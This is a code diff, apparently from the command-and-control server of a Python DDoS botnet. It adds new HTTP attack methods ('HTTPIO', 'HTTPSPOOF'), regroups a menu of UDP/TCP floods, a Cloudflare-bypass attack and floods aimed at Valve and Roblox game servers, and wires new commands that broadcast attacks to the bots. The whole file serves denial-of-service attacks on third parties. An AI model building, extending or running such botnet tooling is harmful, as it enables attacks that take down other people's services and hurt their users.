@@ -1,6 +1,3 @@
-#!/usr/bin/env python3
-#-*- coding: utf-8 -*-
-
 # Tools
 from src.Commands.Tools.url_to_ip import url_to_ip
 from src.Commands.Tools.ip_to_loc import ip_to_loc
@@ -14,8 +11,9 @@ from src.Commands.Methods_L4.tup import tup
 from src.Commands.Methods_L4.ack import ack
 
 # Layer 7
+from src.Commands.Methods_L7.httpio import httpio
+from src.Commands.Methods_L7.httpspoof import httpspoof
 from src.Commands.Methods_L7.httpstorm import httpstorm
-from src.Commands.Methods_L7.iostresser import iostresser
 from src.Commands.Methods_L7.httpcfb import httpcfb
 from src.Commands.Methods_L7.httpget import httpget
 
@@ -105,22 +103,29 @@ help = f"""
 {lightwhite}EXIT         {gray}Disconnects from the net
 """
 
-botnetMethods = f"""
-{gray}L4 Methods:
+Methods_L4 = f"""{gray}L4 Methods:
 {lightwhite}.UDP               {gray}UDP Flood  
 {lightwhite}.TCP               {gray}TCP Flood             
 {lightwhite}.TUP               {gray}TCP and UDP Flood
 {lightwhite}.ACK               {gray}TCP ACK flood
 {lightwhite}.HEX               {gray}HEX Flood
-{lightwhite}.JUNK              {gray}Junk flood
-{gray}L7 Methods:
+{lightwhite}.JUNK              {gray}Junk flood"""
+
+Methods_L7 = f"""{gray}L7 Methods:
+{lightwhite}.HTTPIO            {gray}HTTP IO Stresser
 {lightwhite}.HTTPCFB           {gray}HTTP Cloudflare bypass attack      
 {lightwhite}.HTTPGET           {gray}HTTP GET requests attack
-{lightwhite}.HTTPSTORM         {gray}HTTP STORM Requests
-{lightwhite}.IOSTRESSER        {gray}HTTP STORM Connections
-{gray}Games Methods: 
+{lightwhite}.HTTPSPOOF         {gray}HTTP GET Spoofing
+{lightwhite}.HTTPSTORM         {gray}HTTP STORM Requests"""
+
+GameMethods = f"""{gray}Games Methods: 
 {lightwhite}.VSE               {gray}Valve Source Engine query flood         
-{lightwhite}.ROBLOX            {gray}Roblox UDP Flood
+{lightwhite}.ROBLOX            {gray}Roblox UDP Flood"""
+
+botnetMethods = f"""
+{Methods_L4}
+{Methods_L7}
+{GameMethods}
 """
 
 tools = f"""
@@ -402,8 +407,11 @@ def command_line(client, username):
             elif command == '.HTTPSTORM': # HTTP request attack
                 httpstorm(args, validate_time, send, client, ansi_clear, broadcast, data)
 
-            elif command == '.IOSTRESSER': # FULL POWER !!!
-                iostresser(args, validate_time, send, client, ansi_clear, broadcast, data)
+            elif command == '.HTTPIO': # FULL POWER !!!
+                httpio(args, validate_time, send, client, ansi_clear, broadcast, data)
+
+            elif command == '.HTTPSPOOF': # HTTP GET SPOOF
+                httpspoof(args, validate_time, send, client, ansi_clear, broadcast, data)
 
             elif command == '.HTTPGET': # HTTP request attack
                 httpget(args, validate_time, send, client, ansi_clear, broadcast, data)
